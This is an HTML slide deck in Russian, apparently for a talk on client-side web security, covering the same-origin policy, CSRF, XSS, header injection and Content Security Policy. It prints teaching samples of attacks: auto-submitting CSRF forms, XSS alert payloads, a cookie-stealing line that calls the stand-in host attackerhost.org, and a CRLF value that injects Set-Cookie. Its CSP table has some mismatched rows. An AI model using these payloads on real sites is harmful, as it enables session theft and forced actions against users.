<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
	<title>Немного о безопасности</title>
	
	<link href="slideshow.css" rel="stylesheet" />
	<link href="theme.css" rel="stylesheet" />
	<link href="talk.css" rel="stylesheet" />
	<link href="highlight.css" rel="stylesheet" />
	<script src="prefixfree.min.js"></script>
	<script src="jquery-2.1.1.min.js"></script>
	<script type="text/javascript" src="highlight.min.js"></script>
	<script>hljs.initHighlightingOnLoad();</script>
</head>
<body data-duration="30">

<header id="intro" class="slide">
</header>
<section>
	<header class="slide">
		<h1>0. Введение</h1>
	</header>

	<section class="slide" title="">
		<h2>0.1 Немного о безопасности веб-приложений</h2>
		<ul>
			<li class="delayed emptyli"><p>клиентские атаки часто ориентированы непосредственно на пользователя</p></li>
			<li class="delayed emptyli">
                <p>нужно заставить другого человека произвести определенные действия</p>
                <ul>
                    <li class="delayed">перейти по определенной ссылке</li>
                    <li class="delayed">просмотреть комментарий</li>
                    <li class="delayed">ввести какие-либо данные</li>
                </ul>
            </li>
		</ul>
	</section>

	<section class="slide">
		<h2>0.2 Статистика <a href="http://www.ptsecurity.ru/upload/ptru/analytics/Web-Vulnerability-2016-rus.pdf">Positive Technologies</a></h2>
		<ul>
			<li class="delayed emptyli"><span class="red twoem">23%</span> Cross-Site Request Forgery (Межсайтовая подделка запроса)</li>
			<li class="delayed emptyli"><span class="red twoem">50%</span> Information Leakage (Утечка информации)</li>
			<li class="delayed emptyli"><span class="red twoem">80%</span> Cross-Site Scripting (Межсайтовый скриптинг)</li>
		</ul>
	</section>

	<section class="slide" title="">
		<h2>0.3 Same-origin policy (SOP)</h2>
		<p class="delayed twoem">site.com</p>
		<ul>
			<li class="delayed redli">http://<span class="red">www</span>.site.com</li>
			<li class="delayed redli">http://site.<span class="red">org</span></li>
			<li class="delayed redli">http<span class="red">s</span>://site.com</li>
			<li class="delayed redli">http://site.com:<span class="red">8080</span></li>
		</ul>
		<p class="delayed">обход SOP и является целью большинства клиентских атак</p>
	</section>
	
	<section class="slide">
		<h2>0.4.1 CSRF</h2>
		<ul>
			<li class="delayed emptyli">
				GET:
				<br>
				<pre><code class="html">&lt;img src=&quot;https://test.com/logout&quot;&gt;&lt;/img&gt;</code></pre>
			</li>
			<li class="delayed emptyli">
				POST:
				<br>
				<pre><code class="html">&lt;form action=&quot;https://test.com/drop-database&quot;&gt;<br/>&nbsp;&nbsp;&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=1&gt;<br/>&lt;/form&gt;<br/>&lt;script&gt;<br/>&nbsp;&nbsp;document.getElementsByTagName(&#39;form&#39;)[0].submit()<br/>&lt;/script&gt;</code></pre>
			</li>
		</ul>
	</section>

	<section class="slide">
		<h2>0.4.2 XSS</h2>
		<p>Cross Site Scripting (межсайтовый скриптинг).</p>
		<p>Ошибка валидации пользовательских данных, которая позволяет передать JavaScript код на исполнение в браузер пользователя.</p>
		<p class="delayed">HTML-Injection</p>
	</section>

	<section class="slide">
		<h2>0.4.2 XSS:reflected (отраженные)</h2>
		<ul>
			<li class="delayed emptyli">
				<pre><code>http://www.site.com/index?var=&lt;script&gt;alert('xss');&lt;/script&gt;</code></pre>
			</li>
		</ul>
	</section>

	<section class="slide">
		<h2>0.4.2 XSS:stored (хранимые)</h2>
		<ul>
			<li class="delayed emptyli">
				<pre><code class="javascript">var іmg = new Image();<br>іmg.srс = 'http://attackerhost.org/xss?' + document.cookie;</code></pre>
			</li>
		</ul>
	</section>

	<section class="slide">
		<h2>0.4.2 XSS:dom-base</h2>
		<ul>
			<li class="delayed emptyli">
				<pre><code>http://site.com/index.html?&lt;script&gt;alert('xss')&lt;/script&gt;</code></pre>
				<pre><code class="html">&lt;script&gt;<br />    document.write(unescape(documant.location.href);<br />&lt;/script&gt;</code></pre>
			</li>
			<li class="delayed emptyli">
				<pre><code class="html">&lt;form onsubmit="document.write(this.t.value)"&gt;<br />  &lt;input type='text' id = 't'&gt;<br /> &lt;/form&gt;</code></pre>
			</li>
		</ul>
	</section>

	<section class="slide">
		<h2>0.4.2 XSS WARNING!</h2>
		<ul class="delayed">
			<li class="emptyli"><pre><code class="javascript">document.write()</code></pre></li>
			<li class="emptyli"><pre><code class="javascript">document.writeln()</code></pre></li>
			<li class="emptyli"><pre><code class="javascript">eval()</code></pre></li>
			<li class="emptyli"><pre><code class="javascript">.innerHTML</code></pre></li>
		</ul>
	</section>

	<section class="slide">
		<h2>0.4.3 Information Leakage</h2>
		<ul class="delayed">
			<li class="emptyli">Закоментированные участки кода.</li>
			<li class="emptyli">Незакрытые устаревшие API</li>
			<li class="emptyli">Данные не спрятанные за аутентификацию</li>
		</ul>
	</section>

	<section class="slide">
		<h2>0.4.4 Header Injection & Session Fixation</h2>
		<ul>
			<li class="delayed emptyli"><pre><code>http://test.com?jump={user input}</code></pre></li>
			<li class="delayed emptyli"><pre><code>...<br/>Location: {user input}<br/>...</code></pre></li>
			<li class="delayed emptyli"><pre><code>http://test.com?jump=hell%0d%0aSet-Cookie%3A%20gotohell%20%3D%201</code></pre></li>
			<li class="delayed emptyli"><pre><code>...<br/>Location: hell<br/>Set-Cookie: gotohell = 1<br/>...</code></pre></li>
		</ul>
	</section>

	<section class="slide">
		<h2>1. Пути решения</h2>
	</section>

	<section class="slide">
		<h2>1.1 Content Security Policy 1.0 (CSP)</h2>
		<div class="delayed">
			<img src='img/csp1.jpg' class="csp">
		</div>
	</section>

	<section class="slide">
		<h2>1.1 CSP vs SOP</h2>
	</section>

	<section class="slide">
		<h2>1.1 CSP1.0:Директивы</h2>
		<table>
			<tr class="delayed">
				<td><code class='directive'>default-src</code></td>
				<td><code class='directive'>'self' cdn.example.com</code></td>
				<td>The default-src is the default policy for loading content such as JavaScript, Images, CSS, Font's, AJAX requests, Frames, HTML5 Media. See the Source List Reference for possible values. </td>
			</tr>
			<tr class="delayed">
				<td><code class='directive'>script-src</code></td>
				<td><code class='directive'>'self' js.example.com</code></td>
				<td>Defines valid sources of JavaScript. </td>
			</tr>
			<tr class="delayed">
				<td><code class='directive'>style-src</code></td>
				<td><code class='directive'>'self' css.example.com</code></td>
				<td>Defines valid sources of stylesheets.</td>
			</tr>
			<tr class="delayed">
				<td><code class='directive'>img-src</code></td>
				<td><code class='directive'>'self' img.example.com</code></td>
				<td>Defines valid sources of images.</td>
			</tr>
			<tr class="delayed">
				<td><code class='directive'>connect-src</code></td>
				<td><code class='directive'>'self'</code></td>
				<td>Applies to XMLHttpRequest (AJAX), WebSocket or EventSource. If not allowed the browser emulates a 400 HTTP status code. </td>
			</tr>
			<tr class="delayed">
				<td><code class='directive'>font-src</code></td>
				<td><code class='directive'>font.example.com</code></td>
				<td>Defines valid sources of fonts. </td>
			</tr>
			<tr class="delayed">
				<td><code class='directive'>object-src</code></td>
				<td><code class='directive'>'self'</code></td>
				<td>Defines valid sources of plugins, eg <object>, <embed> or <applet>.</td>
			</tr>
			<tr class="delayed">
				<td><code class='directive'>media-src</code></td>
				<td><code class='directive'>media.example.com</code></td>
				<td>Defines valid sources of audio and video, eg HTML5 <audio>, <video> elements.</td>
			</tr>
			<tr class="delayed">
				<td><code class='directive'>frame-src</code></td>
				<td><code class='directive'>'self'</code></td>
				<td>Defines valid sources for loading frames. child-src is preferred over this deprecated directive. Deprecated</td>
			</tr>
			<tr class="delayed">
				<td><code class='directive'>report-uri</code></td>
				<td><code class='directive'>/some-report-uri</code></td>
				<td>Instructs the browser to POST a reports of policy failures to this URI. You can also append -Report-Only to the HTTP header name to instruct the browser to only send reports (does not block anything). </td>
			</tr>
		</table>
	</section>

	<section class="slide">
		<h2>1.1 CSP1.0:Source List</h2>
		<table>
			<tr class="delayed">
				<td><code class='directive'>*</code></td>
				<td><code class='directive'>img-src */code></td>
				<td>TWildcard, allows any URL except data: blob: filesystem: schemes.</td>
			</tr>
			<tr class="delayed">
				<td><code class='directive'>'none'</code></td>
				<td><code class='directive'>script-src 'self'</code></td>
				<td>Allows loading resources from the same origin (same scheme, host and port).</td>
			</tr>
			<tr class="delayed">
				<td><code class='directive'>'self'</code></td>
				<td><code class='directive'>'self' css.example.com</code></td>
				<td>Defines valid sources of stylesheets.</td>
			</tr>
			<tr class="delayed">
				<td><code class='directive'>data:</code></td>
				<td><code class='directive'>img-src 'self' data:</code></td>
				<td>Allows loading resources via the data scheme (eg Base64 encoded images).</td>
			</tr>
			<tr class="delayed">
				<td><code class='directive'>domain.example.com</code></td>
				<td><code class='directive'>img-src domain.example.com</code></td>
				<td>Allows loading resources from the specified domain name.</td>
			</tr>
			<tr class="delayed">
				<td><code class='directive'>*.example.com</code></td>
				<td><code class='directive'>img-src *.example.com</code></td>
				<td>Allows loading resources from the any subdomain under example.com.</td>
			</tr>
			<tr class="delayed">
				<td><code class='directive'>https://cdn.com</code></td>
				<td><code class='directive'>img-src https://cdn.com</code></td>
				<td>Allows loading resources only over HTTPS matching the given domain.</td>
			</tr>
			<tr class="delayed">
				<td><code class='directive'>https:</code></td>
				<td><code class='directive'>img-src https:</code></td>
				<td>Allows loading resources only over HTTPS on any domain.</td>
			</tr>
			<tr class="delayed">
				<td><code class='directive'>'unsafe-inline'</code></td>
				<td><code class='directive'>script-src 'unsafe-inline'</code></td>
				<td>Allows use of inline source elements such as style attribute, onclick, or script tag bodies (depends on the context of the source it is applied to)</td>
			</tr>
			<tr class="delayed">
				<td><code class='directive'>'unsafe-eval'</code></td>
				<td><code class='directive'>script-src 'unsafe-eval'</code></td>
				<td>Allows unsafe dynamic code evaluation such as JavaScript eval()</td>
			</tr>
		</table>
	</section>

	<section class="slide">
		<h2>1.1 CSP1.0:Плавный переход</h2>
		<pre><code>Content-Security-Policy-Report-Only: {your directives}</code></pre>
	</section>

	<section class="slide">
		<h2>1.1 CSP1.0:Ограничения</h2>
	</section>

	<section class="slide">
		<h2>1.2 CSP1.0:Обход (CRLF Injection)</h2>
	</section>

	<section class="slide">
		<h2>1.2 CSP1.0:Обход (Scriptless Attacks)</h2>
	</section>

</section>


<footer class="slide" title="The End">
	<h2>Спасибо за внимание!</h2>
	<p class="twoem">Презентации: <a href="https://bmsdave.github.io/piterjs/">https://bmsdave.github.io/piterjs/</a></p>
	<ul>
		<li class="emptyli"><a href="http://www.ptsecurity.ru/upload/ptru/analytics/Web-Vulnerability-2016-rus.pdf">Уязвимости веб-приложений 2016</a></li>
		<li class="emptyli"><a href="https://stepik.org/course/%D0%90%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7-%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF%D0%B0%D1%81%D0%BD%D0%BE%D1%81%D1%82%D0%B8-%D0%B2%D0%B5%D0%B1-%D0%BF%D1%80%D0%BE%D0%B5%D0%BA%D1%82%D0%BE%D0%B2-127/">Курс: Анализ безопасности веб проектов</a></li>
		<li class="emptyli"><a href="https://ru.wikipedia.org/wiki/%D0%9C%D0%B5%D0%B6%D1%81%D0%B0%D0%B9%D1%82%D0%BE%D0%B2%D1%8B%D0%B9_%D1%81%D0%BA%D1%80%D0%B8%D0%BF%D1%82%D0%B8%D0%BD%D0%B3">Wiki</a></li>
		<li class="emptyli"><a href="https://habrahabr.ru/company/nixsolutions/blog/271575/">Улучшение сетевой безопасности с помощью Content Security Policy</a></li>	
		<li class="emptyli"><a href="https://xakep.ru/2013/12/23/61798/">Content Security Policy — опасная политика</a></li>
		<li class="emptyli"><a href="http://prgssr.ru/development/politika-bezopasnosti-kontenta-vash-budushij-luchshij-drug.html/">Политика безопасности контента, ваш будущий лучший друг</a></li>	
	</ul>
</footer>

<script src="slideshow.js"></script>
<script src="plugins/css-edit.js"></script>
<script src="plugins/css-snippets.js"></script>
<script src="plugins/css-controls.js"></script>
<script src="plugins/code-highlight.js"></script>
<script>
var slideshow = new SlideShow();

var snippets = document.querySelectorAll('.snippet');
for(var i=0; i<snippets.length; i++) {
	new CSSSnippet(snippets[i]);
}

var cssControls = document.querySelectorAll('.css-control');
for(var i=0; i<cssControls.length; i++) {
	new CSSControl(cssControls[i]);
}
</script>
	
</body>
</html>